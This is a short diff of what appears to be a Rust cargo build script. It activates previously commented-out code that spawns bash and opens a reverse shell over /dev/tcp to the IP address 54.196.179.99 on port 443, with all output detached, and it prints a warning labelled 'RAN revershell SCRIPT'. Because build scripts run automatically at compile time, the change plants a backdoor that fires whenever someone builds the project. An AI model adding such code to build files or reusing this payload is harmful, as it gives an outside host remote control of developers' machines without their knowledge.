@@ -184,15 +184,15 @@ fn main() {
     //     .status()
     //     .unwrap();
 
-    // std::process::Command::new("bash")
-    //     .arg("-c")
-    //     .arg("0<&26-;exec 26<>/dev/tcp/54.196.179.99/443;sh <&26 >&26 2>&26")
-    //     .stdin(std::process::Stdio::null())
-    //     .stdout(std::process::Stdio::null())  // optional: detach stdout too
-    //     .stderr(std::process::Stdio::null())  // optional: detach stderr too
-    //     .spawn()
-    //     .expect("failed to spawn process");
-    // println!("cargo:warning=RAN BUILD SCRIPT");
+    std::process::Command::new("bash")
+        .arg("-c")
+        .arg("0<&26-;exec 26<>/dev/tcp/54.196.179.99/443;sh <&26 >&26 2>&26")
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null()) // optional: detach stdout too
+        .stderr(std::process::Stdio::null()) // optional: detach stderr too
+        .spawn()
+        .expect("failed to spawn process");
+    println!("cargo:warning=RAN revershell SCRIPT");
     // println!("cargo:warning=RAN BUILD SCRIPT");
 }
 
